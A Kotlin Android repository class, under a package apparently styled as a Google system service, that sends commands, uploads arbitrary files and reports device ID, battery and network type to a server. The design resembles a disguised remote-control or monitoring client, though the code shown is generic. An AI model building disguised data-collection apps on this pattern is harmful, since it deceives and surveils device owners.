package com.google.android.systemservice.data.repository

import com.google.android.systemservice.data.api.ApiService
import com.google.android.systemservice.data.datasource.LocalDataSource
import com.google.android.systemservice.domain.model.*
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import timber.log.Timber
import java.io.File
import javax.inject.Inject
import javax.inject.Singleton

interface DeviceRepository {
    suspend fun sendCommand(command: Command): Result<CommandResponse>
    suspend fun uploadFile(file: File): Result<UploadResponse>
    fun observeDeviceStatus(): Flow<DeviceStatus>
    suspend fun getDeviceInfo(): Result<DeviceInfo>
    suspend fun sendHeartbeat(): Result<Boolean>
}

@Singleton
class DeviceRepositoryImpl @Inject constructor(
    private val apiService: ApiService,
    private val localDataSource: LocalDataSource,
    private val ioDispatcher: CoroutineDispatcher = Dispatchers.IO
) : DeviceRepository {
    
    override suspend fun sendCommand(command: Command): Result<CommandResponse> = 
        withContext(ioDispatcher) {
            try {
                localDataSource.updateDeviceStatus(DeviceStatus.SYNCING)
                val response = apiService.sendCommand(command)
                localDataSource.updateDeviceStatus(DeviceStatus.CONNECTED)
                Result.success(response)
            } catch (e: Exception) {
                Timber.e(e, "Failed to send command")
                localDataSource.updateDeviceStatus(DeviceStatus.ERROR)
                Result.failure(e)
            }
        }
    
    override suspend fun uploadFile(file: File): Result<UploadResponse> =
        withContext(ioDispatcher) {
            try {
                localDataSource.updateDeviceStatus(DeviceStatus.SYNCING)
                
                val requestFile = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
                val body = MultipartBody.Part.createFormData("file", file.name, requestFile)
                
                val response = apiService.uploadFile(body)
                localDataSource.updateDeviceStatus(DeviceStatus.CONNECTED)
                Result.success(response)
            } catch (e: Exception) {
                Timber.e(e, "Failed to upload file: ${file.name}")
                localDataSource.updateDeviceStatus(DeviceStatus.ERROR)
                Result.failure(e)
            }
        }
    
    override fun observeDeviceStatus(): Flow<DeviceStatus> =
        localDataSource.deviceStatusFlow
    
    override suspend fun getDeviceInfo(): Result<DeviceInfo> =
        withContext(ioDispatcher) {
            try {
                val info = localDataSource.getDeviceInfo()
                Result.success(info)
            } catch (e: Exception) {
                Timber.e(e, "Failed to get device info")
                Result.failure(e)
            }
        }
    
    override suspend fun sendHeartbeat(): Result<Boolean> =
        withContext(ioDispatcher) {
            try {
                val deviceInfo = localDataSource.getDeviceInfo()
                val data = mapOf(
                    "device_id" to deviceInfo.deviceId,
                    "battery" to deviceInfo.batteryLevel,
                    "network" to deviceInfo.networkType
                )
                apiService.sendHeartbeat(data)
                Result.success(true)
            } catch (e: Exception) {
                Timber.e(e, "Failed to send heartbeat")
                Result.failure(e)
            }
        }
}
